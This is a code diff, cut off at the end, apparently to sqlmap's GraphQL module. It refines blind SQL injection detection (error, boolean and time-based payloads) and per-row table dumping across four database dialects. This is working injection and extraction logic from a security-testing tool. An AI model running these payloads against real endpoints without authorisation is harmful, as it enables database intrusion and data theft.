@@ -5,7 +5,6 @@ Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import difflib
 import json
 import re
 import time
@@ -30,6 +29,12 @@ from lib.core.settings import GRAPHQL_INTROSPECTION_QUERY
 from lib.core.settings import NOSQL_ERROR_REGEX
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.request.connect import Connect as Request
+from lib.utils.nonsql import blockedStatus
+from lib.utils.nonsql import decide as _decide
+from lib.utils.nonsql import Decision as _Decision
+from lib.utils.nonsql import InconclusiveError
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import resolveBit
 from lib.utils.xrange import xrange
 from thirdparty.six import unichr as _unichr
 
@@ -86,6 +91,10 @@ _MIN_RATIO_DIFF = 0.15
 # Cache for INPUT_OBJECT field definitions, populated during schema walks
 _inputFields = {}
 
+# Cache for ENUM value names (first entry used when synthesizing a required enum argument), populated
+# during schema walks - a required enum must be rendered as a bare enum identifier, never a quoted string
+_enumValues = {}
+
 
 # --- Backend SQL dialect table ----------------------------------------------
 
@@ -101,7 +110,55 @@ _inputFields = {}
 # would silently truncate (e.g. MySQL group_concat_max_len=1024).
 Dialect = namedtuple("Dialect", ("fingerprint", "length", "ordinal", "delay",
                                  "banner", "currentUser", "currentDb",
-                                 "tableFrom", "tableCol", "columnFrom", "columnCol", "paginate", "row"))
+                                 "tableFrom", "tableCol", "columnFrom", "columnCol", "paginate", "row",
+                                 "fromIdent"))
+
+
+def _sqlLiteral(value):
+    # A value embedded as a SQL STRING LITERAL (catalog WHERE clauses, OBJECT_ID('..'),
+    # pragma_table_info('..')): standard single-quote doubling, safe on all four back-ends. Without it
+    # a table/column name containing a quote breaks the catalog query and the dump silently yields
+    # nothing.
+    return "'%s'" % getUnicode(value).replace("'", "''")
+
+
+def _identDouble(name):     # SQLite / PostgreSQL: double-quoted, preserves case, embedded '"' doubled
+    return '"%s"' % getUnicode(name).replace('"', '""')
+
+
+def _identBracket(name):    # Microsoft SQL Server: [bracketed], embedded ']' doubled
+    return "[%s]" % getUnicode(name).replace("]", "]]")
+
+
+def _identBacktick(name):   # MySQL: `backticked`, embedded '`' doubled
+    return "`%s`" % getUnicode(name).replace("`", "``")
+
+
+def _qualifiedIdent(name, quoter):
+    # Quote a (possibly schema-qualified) catalog table name for a FROM clause: split a "schema.table"
+    # on the FIRST dot and quote each part with the dialect identifier syntax; quote an unqualified
+    # name whole. Schema-qualification lets PostgreSQL/MSSQL dump tables outside the default schema,
+    # which an unqualified name cannot reference.
+    if "." in name:
+        schema, _, table = name.partition(".")
+        return "%s.%s" % (quoter(schema), quoter(table))
+    return quoter(name)
+
+
+def _sqliteFrom(table):
+    return _qualifiedIdent(table, _identDouble)
+
+
+def _mysqlFrom(table):
+    return _identBacktick(table)            # MySQL enumerates the current database only (unqualified)
+
+
+def _pgsqlFrom(table):
+    return _qualifiedIdent(table, _identDouble)
+
+
+def _mssqlFrom(table):
+    return _qualifiedIdent(table, _identBracket)
 
 
 def _limitOffset(col, offset):
@@ -116,24 +173,55 @@ def _offsetFetch(col, offset):
 # the whole table into a single GROUP_CONCAT/STRING_AGG scalar would be silently
 # truncated by the back-end (MySQL caps group_concat_max_len at 1024 bytes), dropping
 # rows without warning; per-row extraction is unbounded and dialect-uniform.
+# Every row query orders by the (single, concatenated) output column - `ORDER BY 1` - so a given
+# offset refers to the SAME physical row across the length probe AND every per-character probe.
+# Without a stable ordering, offset N could bind to different records between requests and the
+# recovered cell would be a fabricated composite of several rows (the concatenation is a total order;
+# genuinely identical rows are indistinguishable anyway, so uniqueness is not required for stability).
+# In a row query the table and every column are IDENTIFIERS, so they are quoted with the dialect's
+# identifier syntax - otherwise a reserved word, a space, a mixed-case PostgreSQL name, or a name with
+# a quote character produces a broken query and the dump silently drops that table/column. `table` may
+# already be a schema-qualified, pre-quoted identifier from the catalog (PostgreSQL/MSSQL), in which
+# case it is used verbatim.
 def _sqliteRow(columns, table, offset):
-    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns)
-    return "(SELECT %s FROM %s LIMIT 1 OFFSET %d)" % (body, table, offset)
+    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _identDouble(_) for _ in columns)
+    return "(SELECT %s FROM %s ORDER BY 1 LIMIT 1 OFFSET %d)" % (body, _sqliteFrom(table), offset)
 
 
 def _mysqlRow(columns, table, offset):
-    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join("COALESCE(CAST(%s AS CHAR),'NULL')" % _ for _ in columns))
-    return "(SELECT %s FROM %s LIMIT %d,1)" % (body, table, offset)
+    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join("COALESCE(CAST(%s AS CHAR),'NULL')" % _identBacktick(_) for _ in columns))
+    return "(SELECT %s FROM %s ORDER BY 1 LIMIT %d,1)" % (body, _mysqlFrom(table), offset)
 
 
 def _pgsqlRow(columns, table, offset):
-    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns)
-    return "(SELECT %s FROM %s LIMIT 1 OFFSET %d)" % (body, table, offset)
+    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _identDouble(_) for _ in columns)
+    return "(SELECT %s FROM %s ORDER BY 1 LIMIT 1 OFFSET %d)" % (body, _pgsqlFrom(table), offset)
 
 
 def _mssqlRow(columns, table, offset):
-    body = ("+'%s'+" % COL_SEP).join("COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _ for _ in columns)
-    return "(SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)" % (body, table, offset)
+    body = ("+'%s'+" % COL_SEP).join("COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _identBracket(_) for _ in columns)
+    return "(SELECT %s FROM %s ORDER BY 1 OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)" % (body, _mssqlFrom(table), offset)
+
+
+def _sqliteColumnFrom(table):
+    return "FROM pragma_table_info(%s)" % _sqlLiteral(table)
+
+
+def _mysqlColumnFrom(table):
+    # scope to the active database: information_schema.columns holds the same table name across every
+    # schema, so an unscoped lookup would merge unrelated columns and then dump nonexistent fields
+    return "FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s" % _sqlLiteral(table)
+
+
+def _pgsqlColumnFrom(table):
+    # `table` is the catalog's "schema.table"; look columns up by the split schema + table literals
+    schema, _, tbl = table.partition(".") if "." in table else ("public", "", table)
+    return "FROM information_schema.columns WHERE table_schema=%s AND table_name=%s" % (_sqlLiteral(schema), _sqlLiteral(tbl))
+
+
+def _mssqlColumnFrom(table):
+    # OBJECT_ID() resolves a "schema.table" string directly, so the qualified name is passed as a literal
+    return "FROM sys.columns WHERE object_id=OBJECT_ID(%s)" % _sqlLiteral(table)
 
 
 DIALECTS = OrderedDict((
@@ -147,10 +235,11 @@ DIALECTS = OrderedDict((
         currentDb=None,
         tableFrom="FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
         tableCol="name",
-        columnFrom=lambda table: "FROM pragma_table_info('%s')" % table,
+        columnFrom=_sqliteColumnFrom,
         columnCol="name",
         paginate=_limitOffset,
-        row=_sqliteRow)),
+        row=_sqliteRow,
+        fromIdent=_sqliteFrom)),
     ("Microsoft SQL Server", Dialect(
         fingerprint="@@VERSION LIKE '%Microsoft%'",
         length=lambda expr: "LEN((%s))" % expr,
@@ -159,12 +248,14 @@ DIALECTS = OrderedDict((
         banner="@@VERSION",
         currentUser="SYSTEM_USER",
         currentDb="DB_NAME()",
-        tableFrom="FROM sys.tables",
-        tableCol="name",
-        columnFrom=lambda table: "FROM sys.columns WHERE object_id=OBJECT_ID('%s')" % table,
+        # schema-qualify so tables outside dbo are enumerable and dumpable (SCHEMA_NAME + name)
+        tableFrom="FROM sys.tables t",
+        tableCol="CONCAT(SCHEMA_NAME(t.schema_id),'.',t.name)",
+        columnFrom=_mssqlColumnFrom,
         columnCol="name",
         paginate=_offsetFetch,
-        row=_mssqlRow)),
+        row=_mssqlRow,
+        fromIdent=_mssqlFrom)),
     ("PostgreSQL", Dialect(
         fingerprint="(SELECT version()) LIKE 'PostgreSQL%'",
         length=lambda expr: "LENGTH((%s))" % expr,
@@ -173,12 +264,14 @@ DIALECTS = OrderedDict((
         banner="version()",
         currentUser="CURRENT_USER",
         currentDb="CURRENT_DATABASE()",
-        tableFrom="FROM information_schema.tables WHERE table_schema='public'",
-        tableCol="table_name",
-        columnFrom=lambda table: "FROM information_schema.columns WHERE table_name='%s'" % table,
+        # enumerate every user schema (not just public) and carry schema+table so dumps qualify
+        tableFrom="FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')",
+        tableCol="table_schema||'.'||table_name",
+        columnFrom=_pgsqlColumnFrom,
         columnCol="column_name",
         paginate=_limitOffset,
-        row=_pgsqlRow)),
+        row=_pgsqlRow,
+        fromIdent=_pgsqlFrom)),
     ("MySQL", Dialect(
         fingerprint="@@VERSION_COMMENT IS NOT NULL",
         length=lambda expr: "CHAR_LENGTH((%s))" % expr,
@@ -189,10 +282,11 @@ DIALECTS = OrderedDict((
         currentDb="DATABASE()",
         tableFrom="FROM information_schema.tables WHERE table_schema=DATABASE()",
         tableCol="table_name",
-        columnFrom=lambda table: "FROM information_schema.columns WHERE table_name='%s'" % table,
+        columnFrom=_mysqlColumnFrom,
         columnCol="column_name",
         paginate=_limitOffset,
-        row=_mysqlRow)),
+        row=_mysqlRow,
+        fromIdent=_mysqlFrom)),
 ))
 
 
@@ -209,8 +303,6 @@ Slot = namedtuple("Slot", ("operation", "parentType", "fieldName", "allArgs",
 
 # --- Helpers ----------------------------------------------------------------
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 
 def _chunks(sequence, size):
@@ -282,10 +374,16 @@ def _gqlSend(endpoint, query, variables=None):
         kb.postHint = POST_HINT.JSON
         page, _, code = Request.getPage(url=endpoint, post=json.dumps(body),
                                         raise404=False, silent=True)
-    except Exception:
-        return "", 0
+    except Exception as ex:
+        # a transport failure must NOT become an empty body: two failed "true" requests would be
+        # byte-identical (ratio 1.0) and "differ" from a succeeding false request -> a fabricated
+        # confirmation. Return None so the oracles (which reject None) can never decide on it.
+        logger.debug("GraphQL request failed: %s" % getUnicode(ex))
+        return None, 0
     finally:
         kb.postHint = oldPostHint
+    if blockedStatus(code):                 # WAF / rate-limit / 5xx is not a usable oracle sample
+        return None, code
     return page or "", code
 
 
@@ -345,6 +443,29 @@ def _slotValue(page):
             if v is not None:
                 return json.dumps(v, sort_keys=True)
     return json.dumps(data, sort_keys=True)
+
+
+def _hasErrors(page):
+    # True when the GraphQL envelope carries a non-empty `errors` array. A resolver error yields the
+    # SAME `data:null` as a genuine false predicate, so an error-bearing response is UNKNOWN for a
+    # boolean oracle - it must not be classified as a false bit (that would fabricate an oracle /
+    # corrupt extraction). HTTP status is 200 in this case, so only the envelope reveals it.
+    doc = _parseJSON(page)
+    return isinstance(doc, dict) and bool(doc.get("errors"))
+
+
+def _aliasErrored(page, alias):
+    # True when a batched response reports a GraphQL error whose `path` starts at `alias` (that alias's
+    # value is unknown, not a clean false), or when the alias key is absent from `data`.
+    doc = _parseJSON(page)
+    if not isinstance(doc, dict):
+        return True
+    for e in (doc.get("errors") or []):
+        path = e.get("path") if isinstance(e, dict) else None
+        if isinstance(path, list) and path and path[0] == alias:
+            return True
+    data = doc.get("data")
+    return not (isinstance(data, dict) and alias in data)
 
 
 # --- Endpoint detection -----------------------------------------------------
@@ -479,6 +600,7 @@ def _extractSlots(schema):
     # scalar/injectable argument as a Slot
 
     _inputFields.clear()
+    _enumValues.clear()
 
     slots = []
     typeByName = {}
@@ -490,6 +612,8 @@ def _extractSlots(schema):
                     (f["name"], f.get("type", {}), f.get("defaultValue"))
                     for f in (t.get("inputFields") or [])
                 ]
+            elif t.get("kind") == "ENUM":
+                _enumValues[t["name"]] = [e["name"] for e in (t.get("enumValues") or []) if e.get("name")]
 
     queryName = (schema.get("queryType") or {}).get("name")
     mutationName = (schema.get("mutationType") or {}).get("name")
@@ -541,6 +665,57 @@ def _extractSlots(schema):
     return slots
 
 
+# Mutation field-name heuristics: read-like mutations (login/verify/token/...) are safe to probe first;
+# write-like ones (create/update/delete/...) are ranked last so a usable oracle is usually found on a
+# non-persisting resolver before any write-like field is touched.
+_READ_LIKE_MUTATIONS = ("login", "authenticate", "auth", "verify", "validate", "preview", "check",
+                        "token", "signin", "session", "lookup", "search", "get", "fetch", "read", "resolve")
+_WRITE_LIKE_MUTATIONS = ("create", "update", "delete", "insert", "save", "set", "add", "remove",
+                         "register", "upsert", "destroy", "modify", "edit", "write", "put", "patch", "drop")
+# argument names that request a non-persisting / dry-run execution - forced true when present so an
+# automatic mutation probe avoids committing
+_DRYRUN_ARGS = ("dryrun", "dry_run", "preview", "simulate", "validateonly", "validate_only", "noop", "no_op")
+
+
+def _mutationTokens(fieldName):
+    # split camelCase and snake/kebab/space so a mixed name (updateUserPreview) yields distinct tokens
+    # (['update','user','preview']) - a read-like substring must NOT mask a write-like one hidden in the
+    # same name.
+    spaced = re.sub(r"([a-z0-9])([A-Z])", r"\1 \2", getUnicode(fieldName))
+    return [t for t in re.split(r"[^A-Za-z0-9]+", spaced.lower()) if t]
+
+
+def _mutationImpact(fieldName):
+    # WRITE-like WINS: any name whose tokens contain a write keyword is write-like, even if it also
+    # contains a read-like one (updateUserPreview / previewDeleteUser / getAndDeleteUser / createSession).
+    # Only a name with NO write token and at least one read token is read-like; anything else is unknown.
+    tokens = _mutationTokens(fieldName)
+    matches = lambda kws: any(any(kw in tok for kw in kws) for tok in tokens)
+    if matches(_WRITE_LIKE_MUTATIONS):
+        return "write-like"
+    if matches(_READ_LIKE_MUTATIONS):
+        return "read-like"
+    return "unknown"
+
+
+def _rankMutations(slots):
+    order = {"read-like": 0, "unknown": 1, "write-like": 2}
+    return sorted(slots, key=lambda s: order[_mutationImpact(s.fieldName)])
+
+
+def _dryRunVerified(slot, endpoint):
+    """Whether this write-like mutation's NON-PERSISTENCE is automatically PROVEN, so it may be used as
+    the bulk blind-enumeration transport (hundreds/thousands of executions). Forcing an argument named
+    dryRun/preview true is NOT proof - a resolver may ignore, invert, or repurpose the name. A sound
+    proof needs an observed side-effect check (a schema-backed validate-only result that confirms no
+    commit, a rollback/transaction id, a distinct preview result type, or a compensating rollback), none
+    of which can be established reliably from introspection alone here. Returning False keeps write-like
+    mutations DETECTED and REPORTED but off the bulk-enumeration path - the conservative, honest default;
+    it is the hook to wire a real behavioural dry-run confirmation when the schema/environment supports
+    one."""
+    return False
+
+
 def _isInputObject(typeObj, typeByName):
     name = _leafName(_unwrapType(typeObj))
     if not name:
@@ -550,17 +725,27 @@ def _isInputObject(typeObj, typeByName):
 
 
 def _inputSlots(op, rootName, fieldName, allArgs, argName, typeObj,
-                returnKind, returnType, returnSel, typeByName, slots):
-    # Recurse one level into an input object's fields
+                returnKind, returnType, returnSel, typeByName, slots, _depth=0, _seen=None):
+    # Recurse into an input object to ARBITRARY depth, emitting a Slot for every scalar leaf reachable
+    # by a dotted path (input.filter.credentials.username). Bounded by depth and a visited-type set so a
+    # self-/mutually-recursive input schema cannot loop forever.
     inputType = _isInputObject(typeObj, typeByName)
-    if not inputType:
+    if not inputType or _depth > 5:
         return
+    typeName = _leafName(_unwrapType(typeObj))
+    _seen = _seen or set()
+    if typeName in _seen:
+        return
+    _seen = _seen | {typeName}
     for fld in (inputType.get("inputFields") or []):
+        path = "%s.%s" % (argName, fld["name"])
         strategy = _classifyArg(fld.get("type", {}))
         if strategy:
             slots.append(Slot(op, rootName, fieldName, allArgs,
-                              "%s.%s" % (argName, fld["name"]), strategy,
-                              returnKind, returnType, returnSel))
+                              path, strategy, returnKind, returnType, returnSel))
+        elif _isInputObject(fld.get("type", {}), typeByName):
+            _inputSlots(op, rootName, fieldName, allArgs, path, fld.get("type", {}),
+                        returnKind, returnType, returnSel, typeByName, slots, _depth + 1, _seen)
 
 
 def _scalarFields(objType, typeByName, depth=0):
@@ -602,14 +787,21 @@ def _fieldFragment(slot, value, alias=None):
     for argName, argType, default in slot.allArgs:
         if argName == slot.targetArg or slot.targetArg.startswith(argName + "."):
             if "." in slot.targetArg:
-                outer, inner = slot.targetArg.split(".", 1)
+                # target is a path into a (possibly deeply) nested input object: render the whole
+                # containing tree down to the injected leaf, e.g. input:{filter:{credentials:{username:VALUE}}}
+                outer = slot.targetArg.split(".")[0]
                 if argName == outer:
-                    renderedArgs.append("%s: {%s}" % (outer, _renderInputObj(slot, value)))
+                    outerType = _leafName(_unwrapType(argType))
+                    rest = slot.targetArg.split(".")[1:]
+                    renderedArgs.append("%s: {%s}" % (outer, _renderInputPath(outerType, rest, value, slot.strategy)))
                     continue
             renderedArgs.append(_renderArg(argName, value, slot.strategy))
+        elif argName.lower().replace("-", "_") in _DRYRUN_ARGS and _leafName(_unwrapType(argType)) == "Boolean":
+            renderedArgs.append("%s:true" % argName)    # force a dry-run/no-op flag so a mutation probe avoids committing
         else:
-            siblingStrategy = _classifyArg(argType) or "string"
-            renderedArgs.append(_renderArg(argName, _defaultForArg(argType, default), siblingStrategy))
+            sibling = _renderSibling(argName, argType, default)
+            if sibling is not None:                 # None => optional arg with no default -> omitted
+                renderedArgs.append(sibling)
 
     sel = slot.returnSel
     if sel is None:
@@ -655,72 +847,134 @@ def _renderArg(name, value, strategy):
     return '%s:"%s"' % (name, _escapeGraphQLString(value))
 
 
-def _renderInputObj(slot, value):
-    # Render an input-object literal with the target inner field set to `value`
-    # and all required sibling fields filled with safe defaults
-    _, inner = slot.targetArg.split(".", 1)
-
-    outerArg = slot.targetArg.split(".")[0]
-    inputFields = []
-    for aName, aType, aDefault in slot.allArgs:
-        if aName == outerArg:
-            objName = _leafName(_unwrapType(aType))
-            if objName:
-                inputFields = _inputFields.get(objName, [])
-            break
-
+def _renderInputPath(inputTypeName, pathParts, value, strategy, _seen=None):
+    """Render the body of an input-object literal for `inputTypeName`, placing `value` at the field path
+    `pathParts` (one or more levels deep) and filling required sibling fields with synthesized defaults.
+    Descends recursively into nested input objects - e.g. path ['filter','credentials','username'] yields
+    `filter:{credentials:{username:VALUE}}` alongside any required siblings at each level. Depth/cycle
+    bounded via `_seen`."""
+    _seen = _seen or set()
+    fields = _inputFields.get(inputTypeName, [])
+    target = pathParts[0] if pathParts else None
     parts = []
-    for fldName, fldType, fldDefault in inputFields:
-        if fldName == inner:
-            fldStrategy = _classifyArg(fldType) or "string"
-            parts.append(_renderArg(inner, value, fldStrategy))
+    for fldName, fldType, fldDefault in fields:
+        if fldName == target:
+            if len(pathParts) == 1:                 # leaf: the injected value goes here
+                parts.append(_renderArg(fldName, value, _classifyArg(fldType) or strategy or "string"))
+            else:                                    # descend into the nested input object
+                innerName = _leafName(_unwrapType(fldType))
+                if innerName and innerName not in _seen:
+                    parts.append("%s:{%s}" % (fldName, _renderInputPath(innerName, pathParts[1:], value, strategy, _seen | {innerName})))
+                else:
+                    parts.append("%s:{}" % fldName)  # cycle / unknown inner type -> best-effort empty
         else:
-            fldStrategy = _classifyArg(fldType) or "string"
-            parts.append(_renderArg(fldName, _defaultForArg(fldType, fldDefault), fldStrategy))
+            sibling = _renderSibling(fldName, fldType, fldDefault)
+            if sibling is not None:                 # omit optional input-object fields with no default
+                parts.append(sibling)
     return ", ".join(parts)
 
 
-def _defaultForArg(argType, default):
-    # Return a safe GraphQL default value for a field argument: the schema
-    # default if present, otherwise a type-appropriate sentinel
-    if default is not None:
-        return default
-    strategy = _classifyArg(argType)
+def _leafKind(chain):
+    # kind of the innermost NAMED type in an unwrapped type chain (SCALAR / ENUM / INPUT_OBJECT / ...)
+    for kind, name in reversed(chain):
+        if name:
+            return kind
+    return None
+
+
+def _nativeSentinel(argType, depth=0, seen=None):
+    # Synthesize a REQUIRED argument's value in NATIVE GraphQL syntax by type kind. A one-size sentinel
+    # (`0`/`"x"`) is invalid for Boolean/Enum/List/input-object and makes the whole query fail to parse,
+    # so resolver execution (and thus injection) is never reached. A list wrapper takes an empty list
+    # (valid for a NON_NULL list); a bool is `false`; an int/float is `0`; an enum is a bare enum
+    # identifier (first schema value). A required INPUT_OBJECT is built RECURSIVELY - its required inner
+    # fields are populated (schema defaults verbatim, else synthesized) so a nested-required schema like
+    # SearchInput!{ filter: FilterInput!{ term: String! } } yields a VALID benign query instead of a
+    # bare `{}` the server rejects. Recursion is bounded by depth and a visited-type set (cycle safety).
+    chain = _unwrapType(argType)
+    if any(kind == "LIST" for kind, _ in chain):
+        return "[]"
+    named = _leafName(chain)
+    kind = _leafKind(chain)
+    if kind == "ENUM":
+        values = _enumValues.get(named) or []
+        return values[0] if values else '"x"'      # bare enum identifier, not a quoted string
+    if kind == "INPUT_OBJECT":
+        seen = seen or set()
+        if depth >= 5 or named in seen:             # bound depth / break recursive input-type cycles
+            return "{}"
+        seen = seen | {named}
+        parts = []
+        for fName, fType, fDefault in _inputFields.get(named, []):
+            if fDefault is not None:
+                parts.append("%s:%s" % (fName, fDefault))          # schema default is a literal - verbatim
+            elif (fType or {}).get("kind") == "NON_NULL":          # populate ONLY required inner fields
+                parts.append("%s:%s" % (fName, _nativeSentinel(fType, depth + 1, seen)))
+        return "{%s}" % ", ".join(parts)
+    strategy = SCALAR_STRATEGY.get(named)
     if strategy == "numeric":
-        return 0
-    return "x"
+        return "0"
+    if named == "Boolean":
+        return "false"
+    return '"x"'
+
+
+def _renderSibling(name, argType, default):
+    # Render a sibling argument we are NOT injecting into. Returns None to OMIT the argument (the caller
+    # drops it). An OPTIONAL argument with no schema default is OMITTED rather than filled with a bogus
+    # sentinel - filling e.g. an optional Boolean/Enum/List with `"x"` made the whole query invalid and
+    # caused widespread false negatives (resolver execution never reached). A schema-provided
+    # defaultValue is ALREADY a serialized GraphQL literal per the introspection spec (bool `true`, enum
+    # `ADMIN` unquoted, list `[1, 2]`, object `{a: 1}`, null, number, or a quoted string) and is emitted
+    # VERBATIM (never re-quoted). A REQUIRED (NON_NULL) argument with no default is synthesized in native
+    # syntax by kind (see _nativeSentinel).
+    if default is not None:
+        return "%s:%s" % (name, default)
+    if (argType or {}).get("kind") != "NON_NULL":
+        return None                                 # optional + no default -> omit it
+    return "%s:%s" % (name, _nativeSentinel(argType))
 
 
 # --- Detection --------------------------------------------------------------
 
 def _detectError(slot, endpoint):
-    # Error-based detection: inject SQL/NoSQL error-inducing payloads and check
-    # whether the GraphQL `errors` envelope carries a known DBMS signature
+    # Error-based detection with a NEGATIVE CONTROL. A GraphQL endpoint can already return a DBMS
+    # exception for reasons unrelated to our probe (e.g. a required argument we rendered incorrectly),
+    # so a raw "signature present in the injected response" test declares injectable regardless of
+    # influence. Require the signature to be ABSENT from a benign baseline, appear only AFTER the
+    # injected value, and REPRODUCE before accepting it.
+    benign = _buildQuery(slot, "1")
+    basePage = _gqlSend(endpoint, benign)[0] if benign else None
+    baseErr = _errorText(basePage) or ""
+
+    def _appearsOnlyAfterInjection(query, matcher):
+        # matcher(text) -> re.Match or None; True only if it hits the injected response, is absent
+        # from the benign baseline, and reproduces on a second injected request
+        err = _errorText(_gqlSend(endpoint, query)[0])
+        if not err or not matcher(err) or matcher(baseErr):
+            return None
+        err2 = _errorText(_gqlSend(endpoint, query)[0])
+        return matcher(err) if (err2 and matcher(err2)) else None
 
     for payload in _SQL_ERROR_PAYLOADS:
         query = _buildQuery(slot, payload)
         if not query:
             continue
-        page, code = _gqlSend(endpoint, query)
-        err = _errorText(page)
-        if not err:
-            continue
         for pattern in ERROR_PARSING_REGEXES:
-            m = re.search(pattern, err)
+            m = _appearsOnlyAfterInjection(query, lambda t, p=pattern: re.search(p, t))
             if m:
-                return "error-based", m.group("result") if "result" in m.groupdict() else err[:200]
+                detail = m.group("result") if "result" in m.groupdict() else _errorText(_gqlSend(endpoint, query)[0])[:200]
+                return "error-based", detail, payload
 
-    # Try NoSQL error signatures
     for payload in (_NOSQL_NE, _NOSQL_IN):
         query = _buildQuery(slot, payload)
         if not query:
             continue
-        page, code = _gqlSend(endpoint, query)
-        err = _errorText(page)
-        if err and re.search(NOSQL_ERROR_REGEX, err):
-            return "error-based", err[:200]
+        m = _appearsOnlyAfterInjection(query, lambda t: re.search(NOSQL_ERROR_REGEX, t))
+        if m:
+            return "nosql-error-based", (_errorText(_gqlSend(endpoint, query)[0]) or "")[:200], payload
 
-    return None, None
+    return None, None, None
 
 
 def _detectBoolean(slot, endpoint):
@@ -728,30 +982,48 @@ def _detectBoolean(slot, endpoint):
     # payloads. Numeric GraphQL literals (Int/Float) cannot carry SQL payloads.
 
     if slot.strategy == "numeric":
-        return None, None
+        return None, None, None
 
     trueQuery = _buildQuery(slot, _SQL_BOOLEAN_TRUE)
     falseQuery = _buildQuery(slot, _SQL_BOOLEAN_FALSE)
 
     if not trueQuery or not falseQuery:
-        return None, None
+        return None, None, None
 
     truePage, _ = _gqlSend(endpoint, trueQuery)
     truePage2, _ = _gqlSend(endpoint, trueQuery)
     falsePage, _ = _gqlSend(endpoint, falseQuery)
+    falsePage2, _ = _gqlSend(endpoint, falseQuery)
+
+    # a None page is a transport failure / blocked (WAF/5xx) sample - never an oracle observation.
+    # Rejecting it here stops the classic FP where two failed true requests are byte-identical and
+    # "differ" from a succeeding false request.
+    if any(p is None for p in (truePage, truePage2, falsePage, falsePage2)):
+        return None, None, None
+
+    # a GraphQL resolver ERROR yields the same `data:null` as a genuine false predicate, so a false
+    # payload that merely trips a stable resolver error would look like a boolean oracle. Reject any
+    # pair where either side carries `errors` - that case belongs to _detectError, not boolean.
+    if any(_hasErrors(p) for p in (truePage, truePage2, falsePage, falsePage2)):
+        return None, None, None
 
     trueVal = _slotValue(truePage)
     trueVal2 = _slotValue(truePage2)
     falseVal = _slotValue(falsePage)
+    falseVal2 = _slotValue(falsePage2)
+
+    # BOTH sides must independently reproduce (not just the true side)
+    if _ratio(falseVal, falseVal2) < (1.0 - _MIN_RATIO_DIFF):
+        return None, None, None
 
     # Require the true response to be REPRODUCIBLE (trueVal ~= trueVal2) and to diverge
     # from the false response. A single true-vs-false compare turns page jitter into a
     # false positive; a reproducibility guard (like the other non-SQL engines' _boolean)
     # rejects it, since a jittery page also fails to reproduce against itself.
     if _ratio(trueVal, trueVal2) >= (1.0 - _MIN_RATIO_DIFF) and _ratio(trueVal, falseVal) < (1.0 - _MIN_RATIO_DIFF):
-        return "boolean-based blind (string)", truePage
+        return "boolean-based blind (string)", truePage, _SQL_BOOLEAN_TRUE
 
-    return None, None
+    return None, None, None
 
 
 def _detectTime(slot, endpoint):
@@ -759,37 +1031,49 @@ def _detectTime(slot, endpoint):
     # elapsed time against a baseline. Returns (oracleType, threshold, dbms).
 
     if slot.strategy == "numeric":
-        return None, None, None
+        return None, None, None, None
 
     baseQuery = _buildQuery(slot, "x")
     if not baseQuery:
-        return None, None, None
+        return None, None, None, None
 
     def elapsed(query):
+        # return (seconds, usable): a blocked/5xx/transport-failed response is NOT a usable timing
+        # sample, so a slow WAF block cannot establish a time-based finding here (the same
+        # blocked/transport rule the extraction oracle applies).
         start = time.time()
-        _gqlSend(endpoint, query)
-        return time.time() - start
+        page, code = _gqlSend(endpoint, query)
+        dt = time.time() - start
+        return dt, (page is not None and not blockedStatus(code))
 
-    baseline = elapsed(baseQuery)
+    baseDt, baseUsable = elapsed(baseQuery)
+    if not baseUsable:
+        return None, None, None, None
     delay = conf.timeSec
-    cutoff = baseline + delay * 0.5
+    cutoff = baseDt + delay * 0.5
+
+    def slow(query):                                # a CONFIRMED slow, USABLE response
+        dt, usable = elapsed(query)
+        return usable and dt > cutoff
 
     for dbms, dialect in DIALECTS.items():
         if not dialect.delay:
             continue
-        sleepQuery = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay)))
-        if not sleepQuery or elapsed(sleepQuery) <= cutoff:
+        sleepValue = "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay))
+        sleepQuery = _buildQuery(slot, sleepValue)
+        if not sleepQuery or not slow(sleepQuery):
             continue
 
-        # Confirm before attributing: the delay must REPRODUCE and a false-condition
-        # control must stay fast. A single sample turns jitter/a uniformly-slow endpoint
-        # into a false positive and can pin the wrong dialect; requiring the delay to
-        # track the condition rules both out.
+        # Confirm before attributing: the delay must REPRODUCE (usable+slow) and a false-condition
+        # control must stay fast. A single sample turns jitter/a uniformly-slow endpoint into a false
+        # positive and can pin the wrong dialect; requiring the delay to track the condition rules both
+        # out. A blocked slow response is rejected by `slow()` (usable gate).
         controlQuery = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=2", delay)))
-        if elapsed(sleepQuery) > cutoff and (controlQuery is None or elapsed(controlQuery) <= cutoff):
-            return "time-based blind", cutoff, dbms
+        controlDt, controlUsable = elapsed(controlQuery) if controlQuery else (0, True)
+        if slow(sleepQuery) and (controlQuery is None or (controlUsable and controlDt <= cutoff)):
+            return "time-based blind", cutoff, dbms, sleepValue
 
-    return None, None, None
+    return None, None, None, None
 
 
 # --- Boolean / time oracle (universal blind-SQLi primitive) -----------------
@@ -807,54 +1091,119 @@ def _makeOracle(slot, endpoint, dbmsHint=None, threshold=None):
         return "%s' OR (%s)-- " % (SENTINEL, condition)
 
     if threshold is not None and dbmsHint and DIALECTS[dbmsHint].delay:
-        # Timing oracle: a per-document sleep fires only when `condition` holds. Batching
-        # would serialise the sleeps and inflate every request, so it is not offered here.
+        # Timing oracle: a per-document sleep fires only when `condition` holds. Batching would serialise
